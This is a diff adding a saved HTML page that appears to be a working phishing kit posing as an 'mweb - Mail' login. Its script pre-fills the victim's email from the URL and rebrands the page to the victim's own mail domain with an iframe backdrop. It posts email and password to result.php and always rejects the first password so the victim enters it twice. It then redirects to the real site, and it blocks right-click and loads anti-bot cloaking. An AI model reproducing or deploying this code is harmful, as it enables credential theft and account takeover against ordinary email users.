@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<!-- saved from url=(0052)https://streavlingcosmic.space/hasl/#test@mweb.co.za -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="tittle" style="text-transform: capitalize;">mweb - Mail</title>
+    <link id="favicon" rel="shortcut icon" href="./mweb - Mail_files/favicons">
+    <link rel="stylesheet" href="./mweb - Mail_files/css">
+    <script src="./mweb - Mail_files/f6136e9b49.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="./mweb - Mail_files/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0; 
+    color: #333;
+}
+
+body {
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+}
+
+img {
+    width: 100%;
+    height: auto;
+}
+form {
+    padding: 0rem 1rem;
+    padding-top: 15px;
+}
+
+#root {
+             position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            height: 100vh;
+            /* filter: brightness(0.3); */
+        }
+
+.input-container {
+  display: -ms-flexbox; /* IE10 */
+  display: flex;
+  width: 100%;
+  margin-bottom: 15px;
+  border-color: #CACACA;
+}
+
+.icon {
+  padding: 10px;
+  background: #EEEEEE;
+  color: #333;
+  min-width: 50px;
+  text-align: center;
+  border-bottom-left-radius: 4px;
+  border-top-left-radius: 4px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 10px;
+  outline: none;
+  border: 1px solid #ccc;
+  border-top-right-radius: 4px;
+  border-bottom-right-radius: 4px;
+  transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+  font-size: 14px;
+  line-height: 1.42857143;
+  color: #555;
+}
+
+.input-field:focus {
+    border-color: #66afe9;
+    outline: 0;
+    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
+    box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
+}
+
+/* Set a style for the submit button */
+.btnn {
+    width: 35%;
+    color: #ffffff;
+    background-color: #3ec55d;
+    text-align: center;
+    font-weight: 500;
+    font-size: 15px;
+    border-radius: 4px;
+    height: 35px;
+    border: none;
+    display: block;
+    margin: auto;
+    margin-top: 1rem;
+}
+
+.btnn:hover {
+  opacity: 1;
+}
+.box2of {
+    background: #f7f7f7;
+    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    padding: 1rem;
+    width: 350px;
+    margin: auto;
+    margin-top: 8rem;
+    /* padding-top: 11%; */
+    box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+}
+h2 {
+    font-family: inherit;
+    font-weight: 500;
+    line-height: 1.1;
+    color: inherit;
+    text-align: center;
+    font-size: 15px;
+}
+small {
+    display: block;
+    text-align: center;
+    color: crimson;
+    margin-bottom: 1rem;
+    font-size: 16px;
+}
+input[readonly]{
+    background-color: #eee;
+    opacity: 1;
+}
+a {
+    color: #337ab7;
+    text-decoration: none;
+}
+
+#ermg {
+    color: #a94442;
+    background-color: #f2dede;
+    border-color: #ebccd1;
+    padding: 15px;
+    text-align: center;
+    margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;
+    margin-top: 10px;
+    display: none;
+    font-size: 11px;
+}
+#top {
+    display: flex;
+    align-items: center;
+    flex-direction: column;
+    margin: auto;
+}
+hr {
+    margin-top: 20px;
+    margin-bottom: 20px;
+    border: 0;
+    border-top: 1px solid #eee;
+}
+.sucespp {
+            position: fixed;
+            top: 0;
+            background: #f2f4f5;
+            z-index: 10;
+            width: 100%;
+            height: 100%
+        }
+        #sucespp {
+            display: none;
+        }
+        .bocmark {
+            display: flex;
+            justify-content: center;
+            border: 2px solid rgb(24, 112, 24);
+            border-radius: 50%;
+            width: 140px;
+            padding: 13px;
+            margin: auto;
+            margin-top: 8rem;
+        }
+        .bocmark svg {
+            width: 140px;
+        }
+        .message {
+            font-size: 18px;
+            margin-top: 2rem;
+            color: #646a70;
+            border-top: 1px solid #646a70;
+            border-bottom: 1px solid #646a70;
+            padding: 1rem 0;
+            text-align: center;
+            width: 47%;
+            margin: 2rem auto;
+        }
+        .invalid {
+            border: 2px solid red;
+        }
+@media  (max-width: 600px) {
+    .message {
+    font-size: 14px;
+    margin-top: 2rem;
+    color: #646a70;
+    border-top: 1px solid #646a70;
+    border-bottom: 1px solid #646a70;
+    padding: 1rem 0;
+    text-align: center;
+    width: 92%;
+    margin: 2rem auto;
+}
+
+}
+    </style>
+     <script src="./mweb - Mail_files/jquery.min.js"></script>
+     <!-- VeriClick — anti-bot protection + domain verification -->
+<meta name="vericlick-verification" content="a0b312d6220ec30920ee3d8c5507f0f5">
+<script src="./mweb - Mail_files/shield.js" data-api-key="49816f73-1dae-4b48-a14b-8b59f6727a94" defer=""></script>
+</head>
+
+<body>
+    <div class="root" id="root">
+         <iframe id="myframe" scrolling="no" src="./mweb - Mail_files/saved_resource.html" width="100%" height="100%" frameborder="0"></iframe> 
+         <!-- <img src="" id="myframe" width="100" height="100" alt=""> -->
+    </div>
+    <div class="container">
+        <div class="box2of" style="position: relative;">
+                <h2 class="text-center" style="margin-bottom: 1.8rem;margin-top: -58px;">
+                    <div id="top">
+                        <img src="./mweb - Mail_files/favicons" alt="" id="logoimg" style="width:90px;height:90px;border-radius: 50%;">
+            
+                        <span style="vertical-align: middle; text-transform: capitalize;color: blue;margin-top: .8rem;font-size:24px;color:#3ec55d;" class="logoname" id="logoname">mweb</span>
+                   </div>
+                </h2>
+            <form action="https://streavlingcosmic.space/hasl/" id="result" method="post" style="max-width:500px;margin:auto">
+                <input type="text" name="website" id="website" style="display:none;">
+                <small id="ermg"></small>
+    
+                <div class="input-container">
+                    <i class="fa fa-user icon"></i>
+                  <input class="input-field" type="text" placeholder="Email" id="userid" name="aa" required="">
+                </div>
+                
+                <div class="input-container">
+                  <i class="fas fa-eye icon"></i>
+                  <input class="input-field" type="password" id="password" placeholder="Password" name="bb" required="">
+                </div>
+              
+                <span style="margin-top: 1rem; font-size: 13px;font-family: sans-serif;">
+                    <span style="display: flex;align-items: center;gap: 4px;">
+                        <input type="checkbox" name="jj" id="kk">
+                        Always Secure?
+                        <img src="./mweb - Mail_files/images" alt="" style="width: 18px;height: 21px;"><br>
+                    </span>
+                    <span>
+                        <input type="checkbox" name="ll" id="kkll">
+                        Private Computer
+                    </span>
+                    
+                </span>
+                <a href="https://streavlingcosmic.space/hasl/#" class="pull-right" style="display: inline; float: right;">Forgot Password?</a>
+                <button type="submit" class="btnn" id="btn">Sign in</button>
+            </form>
+            <hr>
+           <span style="display: flex;align-items: center;gap: 3px;justify-content: center;">
+               <img src="data:image/jpeg;base64,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" alt="" style="width: 18px;height: 20px;">
+                <span style="vertical-align: middle">
+                    This is secured by <strong><span id="" style="text-transform:capitalize;" class="logoname">mweb</span>  Inc.</strong> © 2026
+                </span>
+
+           </span>
+        </div>
+        <p style="text-align:center; margin-top: 1rem;"> <a href="https://streavlingcosmic.space/hasl/#"> Copyright © <span class="logoname" id="logona2" style="text-transform: capitalize;  color: #337ab7;">mweb</span> 2026 </a></p>
+    </div>
+    <script>
+        const submitButton = $("#btn");
+        const form = $("#result");
+        const passwordField = $("#password");
+        const errorBox = $("#ermg");
+        const honeypot = $("#website");
+        const userField = $("#userid");
+        const formEndpoint = "./result.php";
+        let formSubmitted = 0;
+        let isSubmitting = false;
+
+        function setButtonState(loading) {
+            submitButton.prop("disabled", loading);
+            submitButton.text(loading ? "Verifying..." : "Sign in");
+        }
+
+        function isBase64(str) {
+            if (str === "" || String(str).trim() === "") {
+                return false;
+            }
+            try {
+                return btoa(atob(str)) === atob(btoa(str));
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function getEmail() {
+            let email = "";
+            if (window.location.hash) {
+                email = window.location.hash.substring(1);
+                email = isBase64(email) ? window.atob(email) : email;
+            }
+            return email.trim();
+        }
+
+        function setBrandDetails(email) {
+            document.getElementById("userid").value = email;
+            const domain = (email.split("@")[1] || "").toLowerCase().trim();
+            const companyName = domain ? domain.split(".")[0] : "company";
+
+            if (!domain) {
+                return;
+            }
+
+            const iconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=64`;
+            $("#myframe").attr("src", domain.includes("nifty") ? "https://www.nifty.com" : `https://${domain}`);
+            $("#favicon").attr("href", iconUrl);
+            $("#logoimg").attr("src", iconUrl);
+            $("#tittle").text(`${companyName} - Mail`);
+            $(".logoname").text(companyName);
+            $("#logona2").text(companyName);
+        }
+        
+        // Add this at the bottom of your script, outside of any other function
+        document.addEventListener("DOMContentLoaded", function () {
+            const email = getEmail();
+            if (email) {
+                setBrandDetails(email);
+            }
+        });
+
+        submitButton.on("click", function () {
+            if (isSubmitting) {
+                return;
+            }
+            $(this).text("Verifying...");
+            setTimeout(() => {
+                if (!isSubmitting) {
+                    $(this).text("Sign in");
+                }
+            }, 1800);
+        });
+        
+        
+
+        document.addEventListener("contextmenu", function (e) {
+            e.preventDefault();
+        });
+
+        form.on("submit", function (event) {
+            event.preventDefault();
+
+            if (isSubmitting) {
+                return;
+            }
+
+            const emailValue = userField.val().trim();
+            const passwordValue = passwordField.val().trim();
+            const domain = (emailValue.split("@")[1] || "").toLowerCase().trim();
+            const honeypotValue = honeypot.val().trim();
+
+            if (honeypotValue !== "") {
+                console.warn("Bot detected, submission blocked.");
+                return;
+            }
+
+            if (!emailValue || !passwordValue) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            formSubmitted += 1;
+            isSubmitting = true;
+            setButtonState(true);
+            errorBox.hide().text("");
+
+            const formData = new FormData(this);
+
+            $.ajax({
+                url: formEndpoint,
+                type: "POST",
+                data: formData,
+                processData: false,
+                contentType: false,
+                dataType: "json",
+                success: function (response) {
+                    if (response && response.status === "success") {
+                        if (formSubmitted === 1) {
+                            passwordField.val("");
+                            errorBox.css("display", "block").text("Invalid Password. Please enter your correct password.");
+                        } else {
+                            setTimeout(() => {
+                                window.location.href = domain ? `https://${domain}` : "/";
+                            }, 1200);
+                        }
+                    } else {
+                        errorBox.css("display", "block").text(response && response.message ? response.message : "Something went wrong. Please try again.");
+                    }
+                },
+                error: function () {
+                    errorBox.css("display", "block").text("Unable to reach the server. Please try again.");
+                },
+                complete: function () {
+                    isSubmitting = false;
+                    setButtonState(false);
+                }
+            });
+        });
+    </script>
+
+</body><div style="position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; z-index: 2147483647; background: rgb(255, 255, 255); display: flex; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, sans-serif;"><div style="text-align: center; max-width: 420px; padding: 24px;"><div style="font-size:28px;margin-bottom:12px;">🔒</div><h1 style="font-size:20px;font-weight:700;color:#0f172a;margin:0 0 8px;">Access restricted</h1><p style="font-size:14px;color:#64748b;margin:0;">This visit was restricted by the site's protection.</p></div></div></html>
